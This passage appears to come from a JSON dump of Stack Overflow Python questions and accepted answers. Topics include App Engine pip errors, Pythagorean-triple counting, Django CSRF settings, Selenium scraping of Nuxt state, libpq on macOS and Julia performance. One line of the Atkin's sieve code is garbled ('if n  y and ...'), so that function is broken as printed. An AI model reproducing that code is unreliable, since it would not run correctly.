    "Body": "We are using command prompt c:\\gcloud app deploy app.yaml, but get the following error:\nRunning \"python3 -m pip install --requirement requirements.txt --upgrade --upgrade-strategy only-if-needed --no-warn-script-location --no-warn-conflicts --force-reinstall --no-compile (PIP_CACHE_DIR=/layers/google.python.pip/pipcache PIP_DISABLE_PIP_VERSION_CHECK=1)\"\nStep #2 - \"build\": /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')\nStep #2 - \"build\": Done \"python3 -m pip install --requirement requirements.txt --upgr...\" (34.49892ms)\nStep #2 - \"build\": Failure: (ID: 0ea8a540) /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')\nStep #2 - \"build\": --------------------------------------------------------------------------------\nStep #2 - \"build\": Running \"mv -f /builder/outputs/output-5577006791947779410 /builder/outputs/output\"\nStep #2 - \"build\": Done \"mv -f /builder/outputs/output-5577006791947779410 /builder/o...\" (12.758866ms)\nStep #2 - \"build\": ERROR: failed to build: exit status 1\nFinished Step #2 - \"build\"\nERROR\nERROR: build step 2 \"us.gcr.io/gae-runtimes/buildpacks/python37/builder:python37_20211201_3_7_12_RC00\" failed: step exited with non-zero status: 145\n\nOur Requirements.txt is as below. We are currently on Python 3.7 standard app engine\nfirebase_admin==3.0.0\nsendgrid==6.9.3\ngoogle-auth==1.35.0\ngoogle-auth-httplib2==0.1.0\njinja2==3.0.3\nMarkupSafe==2.0.1\npytz==2021.3\nFlask==2.0.2\ntwilio==6.46.0\nhttplib2==0.20.2\nrequests==2.24.0\nrequests_toolbelt==0.9.1\ngoogle-cloud-tasks==2.7.1\ngoogle-cloud-logging==1.15.1\ngoogleapis-common-protos==1.54.0\n\nPlease help.The above code was working well before updating the requirements.txt file. We tried to remove gunicorn to allow the system pickup the latest according to documentation here.\nWe have a subdirectory structure that stores all the .py files in controllers and db definitions in models. Our main.py has the following -\nsys.path.append(os.path.join(os.path.dirname(__file__), '../controllers'))\nsys.path.append(os.path.join(os.path.dirname(__file__), '../models'))\n\nDoes anyone know how to debug this error -  Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__'). What does this mean?\n",
    "AcceptedAnswerId": 70619556,
    "AcceptedAnswer": "I had the same issue when deploying a Google Cloud Function. The error\n\ncloud function Error while finding module specification for 'pip' (AttributeError: module 'main' has no attribute 'file'); Error ID: c84b3231\n\nappeared after commenting out some packages in the requirements.txt, but that was nothing important and likely did not cause it. I guess that it is more a problem of an instability in Google Storage, since that same Cloud Function I was working on had lost its archive already some time before, all of a sudden, out of nowhere, showing:\n\nArchive not found in the storage location cloud function\n\nand I did not delete or change anything that might explain this, as Archive not found in the storage location: Google Function would suggest. Though that answer has one very interesting guess that might explain at least the very first time the \"Archive not found\" error came up and thus made the CF instable: I might have changed the timezone city of the bucket during browsing the Google Storage. It is too long ago, but I know I browsed the GS, therefore, I cannot exclude this. Quote: \"It [the Archive not found error] may occurr too if GCS bucket's region is not matched to your Cloud function region.\"\nAfter this \"Archive not found\" crash, I manually added main.py and requirements.txt and filled them again with code from the backup. This worked for some time, but there seems to be some general instability in the Google Storage. Therefore, always keep backups of your deployed scripts.\nThen, after getting this pip error of the question in that already instable Cloud Function, waiting for a day or two, Google Function again showed\n\nArchive not found in the storage location cloud function\n\nIf you run into this pip error in a Cloud Function, you might consider updating pip in the \"requirements.txt\" but if you are in such an unstable Cloud Function the better workaround seems to be to create a new Cloud Function and copy everything in there.\nThe pip error probably just shows that the source script, in this case the requirements.txt, cannot be run since the source code is not fully embedded anymore or has lost some embedding in the Google Storage.\nOr you give that Cloud Function a second chance and edit, go to Source tab, click on Dropdown Source code to choose Inline Editor and add main.py and requirements.txt manually (Runtime: Python).\n\n"
}
{
    "Id": 70680363,
    "PostTypeId": 1,
    "Title": "Structural pattern matching using regex",
    "Body": "I have a string that I'm trying to validate against a few regex patterns and I was hoping since Pattern matching is available in 3.10, I might be able to use that instead of creating an if-else block.\nConsider a string 'validateString' with possible values 1021102,1.25.32, string021.\nThe code I tried would be something like the following.\nmatch validateString:\n    case regex1:\n        print('Matched regex1')\n    case regex2:\n        print('Matched regex2')\n    case regex3:\n        print('Matched regex3')\n\nFor regex 1, 2 and 3, I've tried string regex patterns and also re.compile objects but it doesn't seem to work.\nI have been trying to find examples of this over the internet but can't seem to find any that cover regex pattern matching with the new python pattern matching.\nAny ideas for how I can make it work?\nThanks!\n",
    "AcceptedAnswerId": 70680526,
    "AcceptedAnswer": "It is not possible to use regex-patterns to match via structural pattern matching (at this point in time).\nFrom: PEP0643: structural-pattern-matching\n\nPEP 634: Structural Pattern Matching\nStructural pattern matching has been added in the form of a match statement and case statements of patterns with associated actions. Patterns consist of sequences, mappings, primitive data types as well as class instances. Pattern matching enables programs to extract information from complex data types, branch on the structure of data, and apply specific actions based on different forms of data. (emphasis mine)\n\nNothing in this gives any hint that evoking match / search functions of the re module on the provided pattern is intended to be used for matching.\n\nYou can find out more about the reasoning behind strucutral pattern matching by reading the actuals PEPs:\n\nPEP 634 -- Structural Pattern Matching: Specification\nPEP 635 -- Structural Pattern Matching: Motivation and Rationale\nPEP 636 -- Structural Pattern Matching: Tutorial\n\nthey also include ample examples on how to use it.\n"
}
{
    "Id": 70573108,
    "PostTypeId": 1,
    "Title": "Speeding up the loops or different ideas for counting primitive triples",
    "Body": "def pythag_triples(n):\n    i = 0\n    start = time.time()\n    for x in range(1, int(sqrt(n) + sqrt(n)) + 1, 2):\n        for m in range(x+2,int(sqrt(n) + sqrt(n)) + 1, 2):\n            if gcd(x, m) == 1:\n                # q = x*m\n                # l = (m**2 - x**2)/2\n                c = (m**2 + x**2)/2\n                # trips.append((q,l,c))\n                if c < n:\n                    i += 1\n    end = time.time()\n    return i, end-start\nprint(pythag_triples(3141592653589793))\n\nI'm trying to calculate primitive pythagorean triples using the idea that all triples are generated from using m, n that are both odd and coprime. I already know that the function works up to 1000000 but when doing it to the larger number its taken longer than 24 hours. Any ideas on how to speed this up/ not brute force it. I am trying to count the triples.\n",
    "AcceptedAnswerId": 70661056,
    "AcceptedAnswer": "This new answer brings the total time for big_n down to 4min 6s.\nAn profiling of my initial answer revealed these facts:\n\nTotal time: 1h 42min 33s\nTime spent factorizing numbers: almost 100% of the time\n\nIn contrast, generating all primes from 3 to sqrt(2*N - 1) takes only 38.5s (using Atkin's sieve).\nI therefore decided to try a version where we generate all numbers m as known products of prime numbers. That is, the generator yields the number itself as well as the distinct prime factors involved. No factorization needed.\nThe result is still 500_000_000_002_841, off by 4 as @Koder noticed. I do not know yet where that problem comes from. Edit: after correction of the xmax bound (isqrt(2*N - m**2) instead of isqrt(2*N - m**2 - 1), since we do want to include triangles with hypothenuse equal to N), we now get the correct result.\nThe code for the primes generator is included at the end. Basically, I used Atkin's sieve, adapted (without spending much time on it) to Python. I am quite sure it could be sped up (e.g. using numpy and perhaps even numba).\nTo generate integers from primes (which we know we can do thanks to the Fundamental theorem of arithmetic), we just need to iterate through all the possible products prod(p_i**k_i) where p_i is the i^th prime number and k_i is any non-negative integer.\nThe easiest formulation is a recursive one:\ndef gen_ints_from_primes(p_list, upto):\n    if p_list and upto >= p_list[0]:\n        p, *p_list = p_list\n        pk = 1\n        p_tup = tuple()\n        while pk <= upto:\n            for q, p_distinct in gen_ints_from_primes(p_list, upto=upto // pk):\n                yield pk * q, p_tup + p_distinct\n            pk *= p\n            p_tup = (p, )\n    else:\n        yield 1, tuple()\n\nUnfortunately, we quickly run into memory constraints (and recursion limit). So here is a non-recursive version which uses no extra memory aside from the list of primes themselves. Essentially, the current value of q (the integer in process of being generated) and an index in the list are all the information we need to generate the next integer. Of course, the values come unsorted, but that doesn't matter, as long as they are all covered.\ndef rem_p(q, p, p_distinct):\n    q0 = q\n    while q % p == 0:\n        q //= p\n    if q != q0:\n        if p_distinct[-1] != p:\n            raise ValueError(f'rem({q}, {p}, ...{p_distinct[-4:]}): p expected at end of p_distinct if q % p == 0')\n        p_distinct = p_distinct[:-1]\n    return q, p_distinct\n\ndef add_p(q, p, p_distinct):\n    if len(p_distinct) == 0 or p_distinct[-1] != p:\n        p_distinct += (p, )\n    q *= p\n    return q, p_distinct\n\ndef gen_prod_primes(p, upto=None):\n    if upto is None:\n        upto = p[-1]\n    if upto >= p[-1]:\n        p = p + [upto + 1]  # sentinel\n    \n    q = 1\n    i = 0\n    p_distinct = tuple()\n    \n    while True:\n        while q * p[i] <= upto:\n            i += 1\n        while q * p[i] > upto:\n            yield q, p_distinct\n            if i <= 0:\n                return\n            q, p_distinct = rem_p(q, p[i], p_distinct)\n            i -= 1\n        q, p_distinct = add_p(q, p[i], p_distinct)\n\nExample-\n>>> p_list = list(primes(20))\n>>> p_list\n[2, 3, 5, 7, 11, 13, 17, 19]\n\n>>> sorted(gen_prod_primes(p_list, 20))\n[(1, ()),\n (2, (2,)),\n (3, (3,)),\n (4, (2,)),\n (5, (5,)),\n (6, (2, 3)),\n (7, (7,)),\n (8, (2,)),\n (9, (3,)),\n (10, (2, 5)),\n (11, (11,)),\n (12, (2, 3)),\n (13, (13,)),\n (14, (2, 7)),\n (15, (3, 5)),\n (16, (2,)),\n (17, (17,)),\n (18, (2, 3)),\n (19, (19,)),\n (20, (2, 5))]\n\nAs you can see, we don't need to factorize any number, as they conveniently come along with the distinct primes involved.\nTo get only odd numbers, simply remove 2 from the list of primes:\n>>> sorted(gen_prod_primes(p_list[1:]), 20)\n[(1, ()),\n (3, (3,)),\n (5, (5,)),\n (7, (7,)),\n (9, (3,)),\n (11, (11,)),\n (13, (13,)),\n (15, (3, 5)),\n (17, (17,)),\n (19, (19,))]\n\nIn order to exploit this number-and-factors presentation, we need to amend a bit the function given in the original answer:\ndef phi(n, upto=None, p_list=None):\n    # Euler's totient or \"phi\" function\n    if upto is None or upto > n:\n        upto = n\n    if p_list is None:\n        p_list = list(distinct_factors(n))\n    if upto < n:\n        # custom version: all co-primes of n up to the `upto` bound\n        cnt = upto\n        for q in products_of(p_list, upto):\n            cnt += upto // q if q > 0 else -(upto // -q)\n        return cnt\n    # standard formulation: all co-primes of n up to n-1\n    cnt = n\n    for p in p_list:\n        cnt = cnt * (p - 1) // p\n    return cnt\n\nWith all this, we can now rewrite our counting functions:\ndef pt_count_m(N):\n    # yield tuples (m, count(x) where 0 < x < m and odd(x)\n    # and odd(m) and coprime(x, m) and m**2 + x**2 <= 2*N))\n    # in this version, m is generated from primes, and the values\n    # are iterated through unordered.\n    mmax = isqrt(2*N - 1)\n    p_list = list(primes(mmax))[1:]  # skip 2\n    for m, p_distinct in gen_prod_primes(p_list, upto=mmax):\n        if m < 3:\n            continue\n        # requirement: (m**2 + x**2) // 2 <= N\n        # note, both m and x are odd (so (m**2 + x**2) // 2 == (m**2 + x**2) / 2)\n        xmax = isqrt(2*N - m*m)\n        cnt_m = phi(m+1, upto=xmax, p_list=(2,) + tuple(p_distinct))\n        if cnt_m > 0:\n            yield m, cnt_m\n\ndef pt_count(N, progress=False):\n    mmax = isqrt(2*N - 1)\n    it = pt_count_m(N)\n    if progress:\n        it = tqdm(it, total=(mmax - 3 + 1) // 2)\n    return sum(cnt_m for m, cnt_m in it)\n\nAnd now:\n%timeit pt_count(100_000_000)\n31.1 ms \u00b1 38.9 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n%timeit pt_count(1_000_000_000)\n104 ms \u00b1 299 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n# the speedup is still very moderate at that stage\n\n# however:\n%%time\nbig_n = 3_141_592_653_589_793\nN = big_n\nres = pt_count(N)\n\nCPU times: user 4min 5s, sys: 662 ms, total: 4min 6s\nWall time: 4min 6s\n\n>>> res\n500000000002845\n\nAddendum: Atkin's sieve\nAs promised, here is my version of Atkin's sieve. It can definitely be sped up.\ndef primes(limit):\n    # Generates prime numbers between 2 and n\n    # Atkin's sieve -- see http://en.wikipedia.org/wiki/Prime_number\n    sqrtLimit = isqrt(limit) + 1\n\n    # initialize the sieve\n    is_prime = [False, False, True, True, False] + [False for _ in range(5, limit + 1)]\n\n    # put in candidate primes:\n    # integers which have an odd number of\n    # representations by certain quadratic forms\n    for x in range(1, sqrtLimit):\n        x2 = x * x\n        for y in range(1, sqrtLimit):\n            y2 = y*y\n            n = 4 * x2 + y2\n            if n <= limit and (n % 12 == 1 or n % 12 == 5): is_prime[n] ^= True\n            n = 3 * x2 + y2\n            if n <= limit and (n % 12 == 7): is_prime[n] ^= True\n            n = 3*x2-y2\n            if n  y and n % 12 == 11: is_prime[n] ^= True\n\n    # eliminate composites by sieving\n    for n in range(5, sqrtLimit):\n        if is_prime[n]:\n            sqN = n**2\n            # n is prime, omit multiples of its square; this is sufficient because\n            # composites which managed to get on the list cannot be square-free\n            for i in range(1, int(limit/sqN) + 1):\n                k = i * sqN # k \u2208 {n\u00b2, 2n\u00b2, 3n\u00b2, ..., limit}\n                is_prime[k] = False\n    for i, truth in enumerate(is_prime):\n        if truth: yield i\n\n"
}
{
    "Id": 70639443,
    "PostTypeId": 1,
    "Title": "Convert a bytes iterable to an iterable of str, where each value is a line",
    "Body": "I have an iterable of bytes, such as\nbytes_iter = (\n    b'col_1,',\n    b'c',\n    b'ol_2\\n1',\n    b',\"val',\n    b'ue\"\\n',\n)\n\n(but typically this would not be hard coded or available all at once, but supplied from a generator say) and I want to convert this to an iterable of str lines, where line breaks are unknown up front, but could be any of \\r, \\n or \\r\\n. So in this case would be:\nlines_iter = (\n    'col_1,col_2',\n    '1,\"value\"',\n)\n\n(but again, just as an iterable, not so it's all in memory at once).\nHow can I do this?\nContext: my aim is to then pass the iterable of str lines to csv.reader (that I think needs whole lines?), but I'm interested in this answer just in general.\n",
    "AcceptedAnswerId": 70639580,
    "AcceptedAnswer": "Use the io module to do most of the work for you:\nclass ReadableIterator(io.IOBase):\n    def __init__(self, it):\n        self.it = iter(it)\n    def read(self, n):\n        # ignore argument, nobody actually cares\n        # note that it is *critical* that we suppress the `StopIteration` here\n        return next(self.it, b'')\n    def readable(self):\n        return True\n\nthen just call io.TextIOWrapper(ReadableIterator(some_iterable_of_bytes)).\n"
}
{
    "Id": 71086270,
    "PostTypeId": 1,
    "Title": "No module named 'virtualenv.activation.xonsh'",
    "Body": "I triyed to execute pipenv shell in a new environtment and I got the following error:\nLoading .env environment variables\u2026\nCreating a virtualenv for this project\u2026\nUsing /home/user/.pyenv/shims/python3.9 (3.9.7) to create virtualenv\u2026\n\u280bModuleNotFoundError: No module named 'virtualenv.activation.xonsh'\nError while trying to remove the /home/user/.local/share/virtualenvs/7t env: \nNo such file or directory\n\nVirtualenv location: \nWarning: Your Pipfile requires python_version 3.9, but you are using None (/bin/python).\n  $ pipenv check will surely fail.\nSpawning environment shell (/usr/bin/zsh). Use 'exit' to leave.\n\nI tried to remove pipenv, install python with pienv create an alias to python, but anything works.\nAny idea, I got the same error in existing environment, I tried to remove all environments folder but nothing.\nThanks.\n",
    "AcceptedAnswerId": 71092453,
    "AcceptedAnswer": "By github issue, the solution that works was the following:\nsudo apt-get remove python3-virtualenv\n\n"
}
{
    "Id": 70588185,
    "PostTypeId": 1,
    "Title": "WARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH",
    "Body": "When running pip3.8 i get the following warning appearing in my terminal\nWARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH.\n  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.\nSuccessfully installed pip-21.1.1 setuptools-56.0.0\nWARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv\n\nHow to solve this problem on centos 7?\n",
    "AcceptedAnswerId": 70680333,
    "AcceptedAnswer": "This question has been answered on the serverfaults forum: Here is a link to the question.\nYou need to add the following line to your ~/.bash_profile or ~/.bashrc file.\n export PATH=\"/usr/local/bin:$PATH\"\n\nYou will then need to profile, do this by either running the command:\nsource ~/.bash_profile\n\nOr by simply closing your terminal and opening a new session. You should continue to check your PATH to make sure it includes the path.\necho $PATH\n\n"
}
{
    "Id": 70679571,
    "PostTypeId": 1,
    "Title": "How do I set a wildcard for CSRF_TRUSTED_ORIGINS in Django?",
    "Body": "After updating from Django 2 to Django 4.0.1 I am getting CSRF errors on all POST requests. The logs show:\n\"WARNING:django.security.csrf:Forbidden (Origin checking failed - https://127.0.0.1 does not match any trusted origins.): /activate/\"\nI can't figure out how to set a wildcard for CSRF_TRUSTED_ORIGINS? I have a server shipped to customers who host it on their own domain so there is no way for me to no the origin before hand. I have tried the following with no luck:\nCSRF_TRUSTED_ORIGINS = [\"https://*\", \"http://*\"]\n\nand\nCSRF_TRUSTED_ORIGINS = [\"*\"]\n\nExplicitly setting \"https://127.0.0.1\" in the CSRF_TRUSTED_ORIGINS works but won't work in my customer's production deployment which will get another hostname.\n",
    "AcceptedAnswerId": 70689561,
    "AcceptedAnswer": "The Django app is running using Gunicorn behind NGINX. Because SSL is terminated after NGINX request.is_secure() returns false which results in Origin header not matching the host here:\nhttps://github.com/django/django/blob/3ff7f6cf07a722635d690785c31ac89484134bee/django/middleware/csrf.py#L276\nI resolved the issue by adding the following in Django:\nSECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')\n\nAnd ensured that NGINX is forwarding the http scheme with the following in my NGINX conf:\nproxy_set_header X-Forwarded-Proto $scheme;\n\n"
}
{
    "Id": 71184699,
    "PostTypeId": 1,
    "Title": "Filter a dictionary of lists",
    "Body": "I have a dictionary of the form:\n{\"level\": [1, 2, 3],\n \"conf\": [-1, 1, 2],\n \"text\": [\"here\", \"hel\", \"llo\"]}\n\nI want to filter the lists to remove every item at index i where an index in the value \"conf\" is not >0.\nSo for the above dict, the output should be this:\n{\"level\": [2, 3],\n \"conf\": [1, 2],\n \"text\": [\"hel\", \"llo\"]}\n\nAs the first value of conf was not > 0.\nI have tried something like this:\nnew_dict = {i: [a for a in j if a >= min_conf] for i, j in my_dict.items()}\n\nBut that would work just for one key.\n",
    "AcceptedAnswerId": 71184858,
    "AcceptedAnswer": "I solved it with this:\nfrom typing import Dict, List, Any, Set\n\nd = {\"level\":[1,2,3], \"conf\":[-1,1,2], \"text\":[\"-1\", \"hel\", \"llo\"]}\n\n# First, we create a set that stores the indices which should be kept.\n# I chose a set instead of a list because it has a O(1) lookup time.\n# We only want to keep the items on indices where the value in d[\"conf\"] is greater than 0\nfiltered_indexes = {i for i, value in enumerate(d.get('conf', [])) if value > 0}\n\ndef filter_dictionary(d: Dict[str, List[Any]], filtered_indexes: Set[int]) -> Dict[str, List[Any]]:\n    filtered_dictionary = d.copy()  # We'll return a modified copy of the original dictionary\n    for key, list_values in d.items():\n        # In the next line the actual filtering for each key/value pair takes place. \n        # The original lists get overwritten with the filtered lists.\n        filtered_dictionary[key] = [value for i, value in enumerate(list_values) if i in filtered_indexes]\n    return filtered_dictionary\n\nprint(filter_dictionary(d, filtered_indexes))\n\nOutput:\n{'level': [2, 3], 'conf': [1, 2], 'text': ['hel', 'llo']}\n\n"
}
{
    "Id": 70698738,
    "PostTypeId": 1,
    "Title": "Two Walrus Operators in one If Statement",
    "Body": "Is there a correct way to have two walrus operators in 1 if statement?\nif (three:= i%3==0) and (five:= i%5 ==0):\n    arr.append(\"FizzBuzz\")\nelif three:\n    arr.append(\"Fizz\")\nelif five:\n    arr.append(\"Buzz\")\nelse:\n    arr.append(str(i-1))\n\nThis example works for three but five will be \"not defined\".\n",
    "AcceptedAnswerId": 70699069,
    "AcceptedAnswer": "The logical operator and evaluates its second operand only conditionally. There is no correct way to have a conditional assignment that is unconditionally needed.\nInstead use the \"binary\" operator &, which evaluates its second operand unconditionally.\narr = []\nfor i in range(1, 25):\n    #                        v force evaluation of both operands\n    if (three := i % 3 == 0) & (five := i % 5 == 0):\n        arr.append(\"FizzBuzz\")\n    elif three:\n        arr.append(\"Fizz\")\n    elif five:\n        arr.append(\"Buzz\")\n    else:\n        arr.append(str(i))\n\nprint(arr)\n# ['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', ...]\n\nCorrespondingly, one can use | as an unconditional variant of or. In addition, the \"xor\" operator ^ has no equivalent with conditional evaluation at all.\nNotably, the binary operators evaluate booleans as purely boolean  - for example, False | True is True not 1 \u2013 but may work differently for other types. To evaluate arbitrary values such as lists in a boolean context with binary operators, convert them to bool after assignment:\n#  |~~~ force list to boolean ~~| | force evaluation of both operands\n#  v    v~ walrus-assign list ~vv v\nif bool(lines := list(some_file)) & ((today := datetime.today()) == 0):\n   ...\n\nSince assignment expressions require parentheses for proper precedence, the common problem of different precedence between logical (and, or) and binary (&, |, ^) operators is irrelevant here.\n"
}
{
    "Id": 70721360,
    "PostTypeId": 1,
    "Title": "Python/Selenium web scrap how to find hidden src value from a links?",
    "Body": "Scrapping links should be a simple feat, usually just grabbing the src value of the a tag.\nI recently came across this website (https://sunteccity.com.sg/promotions) where the href value of a tags of each item cannot be found, but the redirection still works. I'm trying to figure out a way to grab the items and their corresponding links. My typical python selenium code looks something as such\nall_items = bot.find_elements_by_class_name('thumb-img')\nfor promo in all_items:\n    a = promo.find_elements_by_tag_name(\"a\")\n    print(\"a[0]: \", a[0].get_attribute(\"href\"))\n\nHowever, I can't seem to retrieve any href, onclick attributes, and I'm wondering if this is even possible. I noticed that I couldn't do a right-click, open link in new tab as well.\nAre there any ways around getting the links of all these items?\nEdit: Are there any ways to retrieve all the links of the items on the pages?\ni.e.\nhttps://sunteccity.com.sg/promotions/724\nhttps://sunteccity.com.sg/promotions/731\nhttps://sunteccity.com.sg/promotions/751\nhttps://sunteccity.com.sg/promotions/752\nhttps://sunteccity.com.sg/promotions/754\nhttps://sunteccity.com.sg/promotions/280\n...\n\n\nEdit:\nAdding an image of one such anchor tag for better clarity:\n\n",
    "AcceptedAnswerId": 70725182,
    "AcceptedAnswer": "By reverse-engineering the Javascript that takes you to the promotions pages (seen in https://sunteccity.com.sg/_nuxt/d4b648f.js) that gives you a way to get all the links, which are based on the HappeningID. You can verify by running this in the JS console, which gives you the first promotion:\nwindow.__NUXT__.state.Promotion.promotions[0].HappeningID\n\nBased on that, you can create a Python loop to get all the promotions:\nitems = driver.execute_script(\"return window.__NUXT__.state.Promotion;\")\nfor item in items[\"promotions\"]:\n    base = \"https://sunteccity.com.sg/promotions/\"\n    happening_id = str(item[\"HappeningID\"])\n    print(base + happening_id)\n\nThat generated the following output:\nhttps://sunteccity.com.sg/promotions/724\nhttps://sunteccity.com.sg/promotions/731\nhttps://sunteccity.com.sg/promotions/751\nhttps://sunteccity.com.sg/promotions/752\nhttps://sunteccity.com.sg/promotions/754\nhttps://sunteccity.com.sg/promotions/280\nhttps://sunteccity.com.sg/promotions/764\nhttps://sunteccity.com.sg/promotions/766\nhttps://sunteccity.com.sg/promotions/762\nhttps://sunteccity.com.sg/promotions/767\nhttps://sunteccity.com.sg/promotions/732\nhttps://sunteccity.com.sg/promotions/733\nhttps://sunteccity.com.sg/promotions/735\nhttps://sunteccity.com.sg/promotions/736\nhttps://sunteccity.com.sg/promotions/737\nhttps://sunteccity.com.sg/promotions/738\nhttps://sunteccity.com.sg/promotions/739\nhttps://sunteccity.com.sg/promotions/740\nhttps://sunteccity.com.sg/promotions/741\nhttps://sunteccity.com.sg/promotions/742\nhttps://sunteccity.com.sg/promotions/743\nhttps://sunteccity.com.sg/promotions/744\nhttps://sunteccity.com.sg/promotions/745\nhttps://sunteccity.com.sg/promotions/746\nhttps://sunteccity.com.sg/promotions/747\nhttps://sunteccity.com.sg/promotions/748\nhttps://sunteccity.com.sg/promotions/749\nhttps://sunteccity.com.sg/promotions/750\nhttps://sunteccity.com.sg/promotions/753\nhttps://sunteccity.com.sg/promotions/755\nhttps://sunteccity.com.sg/promotions/756\nhttps://sunteccity.com.sg/promotions/757\nhttps://sunteccity.com.sg/promotions/758\nhttps://sunteccity.com.sg/promotions/759\nhttps://sunteccity.com.sg/promotions/760\nhttps://sunteccity.com.sg/promotions/761\nhttps://sunteccity.com.sg/promotions/763\nhttps://sunteccity.com.sg/promotions/765\nhttps://sunteccity.com.sg/promotions/730\nhttps://sunteccity.com.sg/promotions/734\nhttps://sunteccity.com.sg/promotions/623\n\n"
}
{
    "Id": 70585068,
    "PostTypeId": 1,
    "Title": "How do I get libpq to be found by ctypes find_library?",
    "Body": "I am building a simple DB interface in Python (3.9.9) and I am using psycopg (3.0.7) to connect to my Postgres (14.1) database. Until recently, the development of this app took place on Linux, but now I am using macOS Monterey on an M1 Mac mini. This seems to be causing some troubles with ctypes, which psycopg uses extensively. The error I am getting is the following:\nImportError: no pq wrapper available.\nAttempts made:\n- couldn't import psycopg 'c' implementation: No module named 'psycopg_c'\n- couldn't import psycopg 'binary' implementation: No module named 'psycopg_binary'\n- couldn't import psycopg 'python' implementation: libpq library not found\n\nBased on the source code of psycopg, this is an error of ctypes not being able to util.find_library libpq.dylib. Postgres is installed as Postgres.app, meaning that libpq.dylib's path is\n/Applications/Postgres.app/Contents/Versions/14/bin/lib\nI have tried adding this to PATH, but it did not work. I then created a symlink to the path in /usr/local/lib, but (unsurprisingly) it also did not work. I then did some digging and found this issue describing the same problem. I am not a big macOS expert, so I am unsure on how to interpret some of the points raised. Do I need to add the path to the shared cache? Also, I do not want to fork the Python repo and implement the dlopen() method as suggested, as it seems to lead to other problems.\nAnyhow, is there a solution to quickly bypass this problem? As an additional reference, the code producing the above error is just:\nimport psycopg\n\nprint(psycopg.__version__)\n\n",
    "AcceptedAnswerId": 70740545,
    "AcceptedAnswer": "I had this problem but the solution was suggested to me by this answer to a related question: try setting envar DYLD_LIBRARY_PATH to the path you identified.\nNB, to get it working myself, I:\n\nused the path /Applications/Postgres.app/Contents/Versions/latest/lib and\nhad to install Python 3.9\n\n"
}
{
    "Id": 70729502,
    "PostTypeId": 1,
    "Title": "F2 rename variable doesn't work in vscode + jupyter notebook + python",
    "Body": "I can use the normal F2 rename variable functionality in regular python files in vscode. But not when editing python in a jupyter notebook.\nWhen I press F2 on a variable in a jupyter notebook in vscode I get the familiar change variable window but when I press enter the variable is not changed and I get this error message:\n\nNo result. No result.\n\nIs there a way to get the F2 change variable functionality to work in jupyter notebooks?\nHere's my system info:\njupyter module version\n(adventofcode) C:\\git\\leetcode>pip show jupyter\nName: jupyter\nVersion: 1.0.0\nSummary: Jupyter metapackage. Install all the Jupyter components in one go.\nHome-page: http://jupyter.org\nAuthor: Jupyter Development Team\nAuthor-email: jupyter@googlegroups.org\nLicense: BSD\nLocation: c:\\users\\johan\\anaconda3\\envs\\adventofcode\\lib\\site-packages\nRequires: ipykernel, qtconsole, nbconvert, jupyter-console, notebook, ipywidgets\nRequired-by:\n\nPython version:\n(adventofcode) C:\\git\\leetcode>python --version\nPython 3.10.0\n\nvscode version:\n1.63.2 (user setup)\n\nvscode Jupyter extension version (from the changelog in the extensions window):\n2021.11.100 (November Release on 8 December 2021)\n\n",
    "AcceptedAnswerId": 70736000,
    "AcceptedAnswer": "Notice that you put up a bug report in GitHub and see this issue: Renaming variables didn't work, the programmer replied:\n\nSome language features are currently not supported in notebooks, but\nwe are making plans now to hopefully bring more of those online soon.\n\nSo please wait for this feature.\n"
}
{
    "Id": 70766215,
    "PostTypeId": 1,
    "Title": "Problem with memory allocation in Julia code",
    "Body": "I used a function in Python/Numpy to solve a problem in combinatorial game theory.\nimport numpy as np\nfrom time import time\n\ndef problem(c):\n    start = time()\n    N = np.array([0, 0])\n    U = np.arange(c)\n    \n    for _ in U:\n        bits = np.bitwise_xor(N[:-1], N[-2::-1])\n        N = np.append(N, np.setdiff1d(U, bits).min())\n\n    return len(*np.where(N==0)), time()-start \n\nproblem(10000)\n\nThen I wrote it in Julia because I thought it'd be faster due to Julia using just-in-time compilation.\nfunction problem(c)\n    N = [0]\n    U = Vector(0:c)\n    \n    for _ in U\n        elems = N[1:length(N)-1]\n        bits = elems .\u22bb reverse(elems)\n        push!(N, minimum(setdiff(U, bits))) \n    end\n    \n    return sum(N .== 0)\nend\n\n@time problem(10000)\n\nBut the second version was much slower. For c = 10000, the Python version takes 2.5 sec. on an Core i5 processor and the Julia version takes 4.5 sec. Since Numpy operations are implemented in C, I'm wondering if Python is indeed faster or if I'm writing a function with wasted time complexity.\nThe implementation in Julia allocates a lot of memory. How to reduce the number of allocations to improve its performance?\n",
    "AcceptedAnswerId": 70766903,
    "AcceptedAnswer": "The original code can be re-written in the following way:\nfunction problem2(c)\n    N = zeros(Int, c+2)\n    notseen = falses(c+1)\n\n    for lN in 1:c+1\n        notseen .= true\n        @inbounds for i in 1:lN-1\n            b = N[i] \u22bb N[lN-i]\n            b <= c && (notseen[b+1] = false)\n        end\n        idx = findfirst(notseen)\n        isnothing(idx) || (N[lN+1] = idx-1)\n    end\n    return count(==(0), N)\nend\n\nFirst check if the functions produce the same results:\njulia> problem(10000), problem2(10000)\n(1475, 1475)\n\n(I have also checked that the generated N vector is identical)\nNow let us benchmark both functions:\njulia> using BenchmarkTools\n\njulia> @btime problem(10000)\n  4.938 s (163884 allocations: 3.25 GiB)\n1475\n\njulia> @btime problem2(10000)\n  76.275 ms (4 allocations: 79.59 KiB)\n1475\n\nSo it turns out to be over 60x faster.\nWhat I do to improve the performance is avoiding allocations. In Julia it is easy and efficient. If any part of the code is not clear please comment. Note that I concentrated on showing how to improve the performance of Julia code (and not trying to just replicate the Python code, since - as it was commented under the original post - doing language performance comparisons is very tricky). I think it is better to concentrate in this discussion on how to make Julia code fast.\n\nEDIT\nIndeed changing to Vector{Bool} and removing the condition on b and c relation (which mathematically holds for these values of c) gives a better speed:\njulia> function problem3(c)\n           N = zeros(Int, c+2)\n           notseen = 